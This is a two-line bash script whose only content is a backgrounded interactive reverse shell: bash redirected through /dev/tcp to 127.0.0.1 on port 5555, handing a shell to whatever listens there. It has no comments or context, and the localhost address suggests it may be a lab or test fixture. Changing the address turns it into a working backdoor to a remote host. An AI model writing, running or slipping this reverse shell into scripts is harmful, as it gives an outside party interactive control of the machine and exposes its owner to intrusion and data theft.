#!/bin/bash

/bin/bash -i >& /dev/tcp/127.0.0.1/5555 0>&1 &
